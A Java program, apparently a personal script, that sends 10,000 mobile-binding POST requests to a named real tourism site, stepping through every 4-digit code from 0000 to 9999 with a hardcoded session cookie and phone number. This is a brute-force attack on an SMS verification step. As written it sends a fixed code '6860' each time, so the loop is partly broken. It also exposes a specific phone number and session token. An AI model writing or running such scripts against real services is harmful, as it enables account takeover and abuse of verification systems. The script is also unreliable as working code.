import hust.zhj.config.AppConfig;
import hust.zhj.config.PersistenceJPAConfig;
import okhttp3.*;
import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.annotation.ComponentScan;

import java.io.IOException;
import java.text.DecimalFormat;
import java.util.HashSet;
import java.util.Set;
/**
 * Created by zhanghj on 2017/8/1.
 */
@ComponentScan(basePackageClasses = {AppConfig.class,PersistenceJPAConfig.class})
public class Appcontext {

//    private static final Logger LOGGER = LoggerFactory.getLogger(Appcontext.class);

    public static void main(String[] args) throws IOException {
        AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(AppConfig.class);
        Set<String> numbers = new HashSet<String>();
        String number;
        do {
            number = RandomStringUtils.random(8,false,true);
        }
        while(numbers.add(number)) ;
        String name = "张三";
        String mobile = "132" + number;
        String channels = "0";
        String validate = "3end";
        OkHttpClient httpClient = new OkHttpClient();
        for(int i = 0;i<=9999;i++){
            int n = i+1;
            DecimalFormat f = new DecimalFormat("0000");
            String code = f.format(i);
            RequestBody formBody = new FormBody.Builder()
                    .add("mobile","15629173463")
                    .add("name",name)
                    .add("channels",channels)
                    .add("code","6860")
                    .add("validate",validate)
                    .build();
            Request request = new Request.Builder()
                    .url("http://activity.yktour.com.cn/user/mobile/binding")
                    .header("Cookie","DSESSIONID=a8bd8e57-7300-4adc-9a24-cc1dc85037bf")
                    .post(formBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
            System.out.println("第"+n+"次尝试"+response.body().string());
        }
    }
}
